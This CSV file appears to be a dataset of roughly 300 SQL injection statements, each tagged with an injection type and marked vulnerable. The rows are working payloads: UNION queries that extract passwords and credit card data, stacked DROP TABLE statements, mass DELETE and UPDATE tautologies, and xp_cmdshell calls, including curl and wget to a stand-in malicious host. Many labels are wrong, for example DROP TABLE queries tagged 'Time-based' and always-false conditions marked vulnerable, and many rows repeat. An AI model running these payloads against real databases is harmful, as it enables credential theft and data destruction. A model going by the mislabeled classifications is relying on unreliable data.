SQL Query,Injection Type,Vulnerability Status
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'bio update'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='cherry' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE suppliers;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '1'='1';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
UPDATE accounts SET balance=2000 WHERE id=''; EXEC sp_executesql N'DROP TABLE users';--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE price > 100; DROP TABLE prices;--,Time-based,Yes
UPDATE employees SET salary=60000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM customers WHERE address='' UNION SELECT username, password FROM users;--",Union-based,Yes
DELETE FROM orders WHERE order_id='1' AND '1'='1';--,Boolean-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR '1'='0';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE categories;--,Union-based,Yes
UPDATE accounts SET balance=500 WHERE id=''; EXEC xp_cmdshell('net user');--,Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR 'x'='x';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
SELECT email FROM customers WHERE email='' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE name='' OR '2'='2';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('malicious log'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='active' WHERE username='' OR '1'='0';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '0'='0';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '2'='2';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 250); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='inactive' WHERE user_id='' OR '1'='0';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE accounts;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '1'='0';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'malicious bio'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='strawberry' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '1'='0';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE suppliers;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '1'='0';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
UPDATE accounts SET balance=3000 WHERE id=''; EXEC sp_executesql N'DROP TABLE users';--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE price < 50; DROP TABLE prices;--,Time-based,Yes
UPDATE employees SET salary=70000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM users;--",Union-based,Yes
DELETE FROM orders WHERE order_id='1' AND '1'='0';--,Boolean-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR '1'='1';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT password, email FROM users;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE categories;--,Union-based,Yes
"UPDATE accounts SET balance=500 WHERE id=''; EXEC sp_configure 'show advanced options', 1;--",Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR '1'='1';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
SELECT email FROM customers WHERE email='' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE name='' OR '1'='1';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('hack attempt'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='active' WHERE username='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '1'='1';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 500); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='inactive' WHERE user_id='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE users;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '1'='1';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'updated bio'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='kiwi' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE suppliers;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '1'='1';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
UPDATE accounts SET balance=4000 WHERE id=''; EXEC sp_executesql N'DROP TABLE logs';--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE price < 10; DROP TABLE prices;--,Time-based,Yes
UPDATE employees SET salary=80000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM users;--",Union-based,Yes
DELETE FROM orders WHERE order_id='1' AND '0'='0';--,Boolean-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR '1'='2';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT email, credit_card FROM customers;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE suppliers;--,Union-based,Yes
UPDATE accounts SET balance=1000 WHERE id=''; EXEC xp_cmdshell('dir');--,Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR '2'='2';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE name='' OR '3'='3';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('unauthorized access'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='inactive' WHERE username='' OR '2'='2';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '2'='2';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 600); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='active' WHERE user_id='' OR '2'='2';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE accounts;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '2'='2';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'suspicious activity'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='orange' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '2'='2';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE categories;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '2'='2';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
UPDATE accounts SET balance=5000 WHERE id=''; EXEC sp_executesql N'DROP TABLE logs';--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE price < 5; DROP TABLE prices;--,Time-based,Yes
UPDATE employees SET salary=90000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM users;--",Union-based,Yes
DELETE FROM orders WHERE order_id='1' AND '1'='1';--,Boolean-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR '1'='3';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE customers;--,Union-based,Yes
UPDATE accounts SET balance=2000 WHERE id=''; EXEC xp_cmdshell('whoami');--,Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR '3'='3';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM products WHERE name='' OR '4'='4';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('access denied'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='suspended' WHERE username='' OR '3'='3';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '0'='0';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '3'='3';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 700); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='locked' WHERE user_id='' OR '3'='3';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE transactions;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '3'='3';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'malicious update'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='grape' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '3'='3';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE suppliers;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '3'='3';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
UPDATE accounts SET balance=6000 WHERE id=''; EXEC sp_executesql N'DROP TABLE users';--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE price < 3; DROP TABLE prices;--,Time-based,Yes
UPDATE employees SET salary=100000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM users;--",Union-based,Yes
DELETE FROM orders WHERE order_id='1' AND '0'='0';--,Boolean-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR '1'='4';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT email, phone FROM customers;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE users;--,Union-based,Yes
UPDATE accounts SET balance=3000 WHERE id=''; EXEC xp_cmdshell('hostname');--,Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR '4'='4';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM products WHERE name='' OR '5'='5';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('intrusion detected'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='disabled' WHERE username='' OR '4'='4';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '0'='1';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '4'='4';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 800); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='frozen' WHERE user_id='' OR '4'='4';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE profiles;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '4'='4';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'malicious entry'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='lemon' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '4'='4';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE categories;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '4'='4';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
UPDATE accounts SET balance=7000 WHERE id=''; EXEC sp_executesql N'DROP TABLE transactions';--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE price < 2; DROP TABLE prices;--,Time-based,Yes
UPDATE employees SET salary=110000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM users;--",Union-based,Yes
DELETE FROM orders WHERE order_id='1' AND '1'='2';--,Boolean-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR '1'='5';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT username, email FROM customers;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE orders;--,Union-based,Yes
UPDATE accounts SET balance=4000 WHERE id=''; EXEC xp_cmdshell('ipconfig');--,Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR '5'='5';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM employees;--",Union-based,Yes
"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM products WHERE name='' OR '6'='6';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('breach detected'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='archived' WHERE username='' OR '5'='5';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '0'='2';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '5'='5';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 900); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='blocked' WHERE user_id='' OR '5'='5';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE payments;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '5'='5';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM employees;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'suspicious update'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='peach' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '5'='5';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE suppliers;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '5'='5';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
UPDATE accounts SET balance=8000 WHERE id=''; EXEC sp_executesql N'DROP TABLE customers';--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE price < 1; DROP TABLE prices;--,Time-based,Yes
UPDATE employees SET salary=120000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM admins;--",Union-based,Yes
DELETE FROM orders WHERE order_id='1' AND '1'='3';--,Boolean-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR '1'='6';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT user_id, email FROM customers;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE transactions;--,Union-based,Yes
UPDATE accounts SET balance=5000 WHERE id=''; EXEC xp_cmdshell('curl http://malicious.com');--,Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR '6'='6';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM sales;--",Union-based,Yes
"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM products WHERE name='' OR '7'='7';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('security breach'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='suspended' WHERE username='' OR '6'='6';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '0'='3';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '6'='6';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 1000); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='suspended' WHERE user_id='' OR '6'='6';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE accounts;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '6'='6';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM sales;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'unauthorized access'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='banana' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '6'='6';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM sales;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE users;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '6'='6';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM sales;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
UPDATE accounts SET balance=9000 WHERE id=''; EXEC sp_executesql N'DROP TABLE transactions';--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE price < 0.5; DROP TABLE prices;--,Time-based,Yes
UPDATE employees SET salary=130000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM sales;--",Union-based,Yes
DELETE FROM orders WHERE order_id='1' AND '1'='4';--,Boolean-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR '1'='7';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT password, email FROM customers;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE suppliers;--,Union-based,Yes
UPDATE accounts SET balance=6000 WHERE id=''; EXEC xp_cmdshell('wget http://malicious.com');--,Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR '7'='7';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM customers;--",Union-based,Yes
SELECT * FROM products WHERE name='' OR '8'='8';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('unauthorized access attempt'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='activated' WHERE username='' OR '7'='7';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '0'='4';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '7'='7';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 1100); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='active' WHERE user_id='' OR '7'='7';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE transactions;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '7'='7';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'malicious profile'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='kiwi' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '7'='7';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
